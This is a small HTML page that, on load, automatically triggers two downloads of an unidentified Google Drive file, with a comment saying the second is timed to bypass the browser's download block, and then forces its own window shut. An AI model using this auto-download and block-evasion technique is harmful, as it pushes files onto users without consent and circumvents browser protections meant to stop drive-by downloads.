<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Downloading Files...</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; background-color: #f9f9f9; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    <script>
        window.onload = function() {
            // 1. Trigger first download immediately
            var link1 = document.createElement('a');
            link1.href = 'https://drive.usercontent.google.com/download?id=1RK1xHRRRcbXJTYxj40VGTCtFWVHf_YfU';
            document.body.appendChild(link1);
            link1.click();

            // 2. Trigger second download after 1 second (bypasses browser block)
            setTimeout(function() {
                var link2 = document.createElement('a');
                link2.href = 'https://drive.usercontent.google.com/download?id=1RK1xHRRRcbXJTYxj40VGTCtFWVHf_YfU';
                document.body.appendChild(link2);
                link2.click();
            }, 1000); 

            // 3. Automatically close the window after 3 seconds
            setTimeout(function() {
                // Tries standard close, or forces a self-redirect to allow close
                if (!window.close()) {
                    window.open('', '_self', '');
                    window.close();
                }
            }, 3000);
        };
    </script>
</head>
<body>
    <h2>Starting your downloads...</h2>
    <div class="loader"></div>
    <p>This window will close automatically in a moment.</p>
</body>
</html>
